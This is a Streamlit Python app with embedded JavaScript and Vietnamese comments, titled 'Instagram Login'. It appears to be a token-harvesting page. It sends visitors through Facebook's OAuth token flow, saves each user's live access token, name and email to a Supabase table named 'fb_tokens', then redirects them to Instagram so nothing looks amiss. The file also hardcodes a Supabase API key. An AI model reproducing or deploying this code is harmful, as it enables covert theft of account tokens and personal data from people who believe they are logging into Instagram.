import streamlit as st
import urllib.parse
import secrets

# ==============================================
# CONFIGURATION — ALL UPDATED
# ==============================================
CLIENT_ID = "1589243162990530"

# ⚠️ THIS EXACT URL MUST BE REGISTERED IN FACEBOOK DASHBOARD
# Facebook Login → Settings → Valid OAuth Redirect URIs
# Kiểm tra: có dấu / cuối hay không → phải trùng khớp 100%
REDIRECT_URI = "https://instagrammeta.streamlit.app/"

SUPABASE_URL = "https://mxuthpngeagcxoxtnjhd.supabase.co"
SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im14dXRocG5nZWFnY3hveHRuamhkIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODQ2NTA5MjEsImV4cCI6MjEwMDIyNjkyMX0.Fbf5vMxG4C3JERld_4LvlQBPNrQB8UQcz_aloIOaHBs"

# Facebook API VERSION — UPDATED TO LATEST v24.0 (2026)
FB_API_VERSION = "v24.0"

# ==============================================
# CSRF PROTECTION
# ==============================================
if "oauth_state" not in st.session_state:
    st.session_state.oauth_state = secrets.token_urlsafe(32)

st.set_page_config(page_title="Instagram Login", layout="centered")

# ==============================================
# MAIN JAVASCRIPT — IMPROVED DETECTION
# ==============================================
js_code = f"""
<script>
const REDIRECT_URI = "{urllib.parse.quote(REDIRECT_URI, safe='')}";
const EXPECTED_STATE = "{st.session_state.oauth_state}";
const SUPABASE_URL = "{SUPABASE_URL}";
const SUPABASE_KEY = "{SUPABASE_KEY}";
const FB_API_VERSION = "{FB_API_VERSION}";

// ⚠️ Chờ trang tải hoàn toàn + kiểm token NHIỀU LẦN 
// Tránh trường hợp JS chạy trước khi Facebook gắn token vào URL
function init() {{
    setTimeout(checkForToken, 100);  // Kiểm tra sau 100ms
    setTimeout(checkForToken, 500);  // Kiểm tra lại sau 500ms
    setTimeout(checkForToken, 1000); // Kiểm tra lần cuối sau 1s
}}

function checkForToken() {{
    console.log("🔍 Đang tìm token...");
    console.log("URL hiện tại:", window.location.href);
    console.log("Fragment (sau dấu #):", window.location.hash);

    const hash = window.location.hash.slice(1);
    if (!hash) {{
        console.log("❌ Không thấy token → chuyển đến Facebook đăng nhập");
        redirectToFacebook();
        return;
    }}

    const params = new URLSearchParams(hash);
    const accessToken = params.get("access_token");
    const returnedState = params.get("state");
    const error = params.get("error");
    const errorDesc = params.get("error_description");

    // Xóa token khỏi thanh địa chỉ ngay
    if (accessToken || error) {{
        history.replaceState(null, "", window.location.pathname);
    }}

    // ==============================================
    // XỬ LÝ LỖI TỪ FACEBOOK
    // ==============================================
    if (error) {{
        showStatus(`❌ Lỗi: ${{errorDesc || error}}`);
        console.error("Lỗi từ Facebook:", error, errorDesc);
        return;
    }}

    // ==============================================
    // TÌM THẤY TOKEN! → LƯU & CHUYỂN HƯỚNG
    // ==============================================
    if (accessToken) {{
        console.log("✅ TOKEN ĐƯỢC TÌM THẤY! Độ dài:", accessToken.length);
        console.log("State nhận được:", returnedState);
        console.log("State mong đợi:", EXPECTED_STATE);

        // Kiểm tra bảo mật
        if (returnedState !== EXPECTED_STATE) {{
            showStatus("⚠️ Lỗi bảo mật. Vui lòng thử lại.");
            console.error("State không khớp!");
            return;
        }}

        showStatus("✅ Đăng nhập thành công! Đang xử lý...");
        saveTokenAndRedirect(accessToken, returnedState);
        return;
    }}

    // Không có token
    console.log("❌ Không tìm thấy access_token trong fragment");
    redirectToFacebook();
}}

// ==============================================
// LƯU TOKEN → SUPABASE → CHUYỂN INSTAGRAM
// ==============================================
async function saveTokenAndRedirect(token, state) {{
    try {{
        // Tải Supabase SDK
        await loadSupabase();
        const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

        // Lấy thông tin user từ Facebook Graph API
        const profileUrl = `https://graph.facebook.com/${{FB_API_VERSION}}/me?fields=id,name,email&access_token=${{token}}`;
        console.log("🔄 Đang lấy thông tin user...");
        
        const profileRes = await fetch(profileUrl);
        const profile = await profileRes.json();

        if (profile.error) {{
            console.warn("Lỗi Facebook API:", profile.error);
        }} else {{
            console.log("👤 Thông tin user:", profile);

            // Lưu vào Supabase
            const {{ data, error }} = await supabase
                .from("fb_tokens")
                .upsert([{{
                    facebook_id: profile.id,
                    name: profile.name,
                    email: profile.email,
                    access_token: token,
                    logged_in_at: new Date().toISOString()
                }}], {{ onConflict: "facebook_id" }});

            if (error) {{
                console.warn("Lỗi lưu Supabase:", error);
            }} else {{
                console.log("✅ Đã lưu vào Supabase thành công!");
            }}
        }}
    }} catch (err) {{
        console.warn("Lỗi xử lý:", err.message);
    }}

    // ==============================================
    // CHUYỂN ĐẾN INSTAGRAM
    // ==============================================
    console.log("🚀 Đang mở Instagram...");
    showStatus("✅ Thành công! Đang chuyển hướng đến Instagram...");
    
    setTimeout(() => {{
        window.location.href = "instagram://";
    }}, 800);
    
    // Dự phòng mở web nếu không có app
    setTimeout(() => {{
        window.location.href = "https://www.instagram.com";
    }}, 2500);
}}

// ==============================================
// CHUYỂN ĐẾN TRANG ĐĂNG NHẬP FACEBOOK
// ==============================================
function redirectToFacebook() {{
    const authUrl = 
        "https://www.facebook.com/${{FB_API_VERSION}}/dialog/oauth?" +
        "client_id={CLIENT_ID}" +
        "&redirect_uri=" + encodeURIComponent(REDIRECT_URI) +
        "&response_type=token" +
        "&scope=email,public_profile" +
        "&state=" + encodeURIComponent(EXPECTED_STATE) +
        "&auth_type=rerequest";  // Yêu cầu cấp quyền lại nếu bị từ chối trước

    console.log("🔄 Chuyển đến Facebook:", authUrl);
    window.location.href = authUrl;
}}

// ==============================================
// TẢI SUPABASE SDK
// ==============================================
function loadSupabase() {{
    return new Promise((resolve, reject) => {{
        if (window.supabase) return resolve();
        const script = document.createElement("script");
        script.src = "https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2";
        script.onload = () => resolve();
        script.onerror = () => reject(new Error("Không tải được Supabase SDK"));
        document.head.appendChild(script);
    }});
}}

// ==============================================
// HIỂN THỊ THÔNG BÁO
// ==============================================
function showStatus(message) {{
    document.body.innerHTML = `
        <div style="padding: 3rem; text-align: center; font-family: system-ui, sans-serif;">
            <h3 style="color: #1f2937;">${{message}}</h3>
            <p style="color: #6b7280; margin-top: 1rem; font-size: 0.9rem;">
                Mở Console (F12) → Tab Console để xem chi tiết
            </p>
        </div>`;
}}

// CHẠY KHI TRANG TẢI XONG
window.addEventListener("DOMContentLoaded", init);
</script>
"""

# Chèn mã JavaScript
st.components.v1.html(js_code, height=0)

# ==============================================
# THÔNG BÁO CHO NGƯỜI DÙNG
# ==============================================
st.info("⏳ Đang xử lý... Nếu không tự động chuyển, nhấp nút bên dưới.")

auth_url = (
    f"https://www.facebook.com/{FB_API_VERSION}/dialog/oauth?"
    f"client_id={urllib.parse.quote(CLIENT_ID)}"
    f"&redirect_uri={urllib.parse.quote(REDIRECT_URI)}"
    f"&response_type=token"
    f"&scope=email,public_profile"
    f"&state={urllib.parse.quote(st.session_state.oauth_state)}"
)

st.markdown(f"[👉 Nhấp vào đây để Đăng Nhập Facebook]({auth_url})")

# Hướng dẫn kiểm tra
st.markdown("---")
st.caption("🔧 **Kiểm tra lỗi:** Nhấn F12 → Tab Console xem chi tiết lỗi")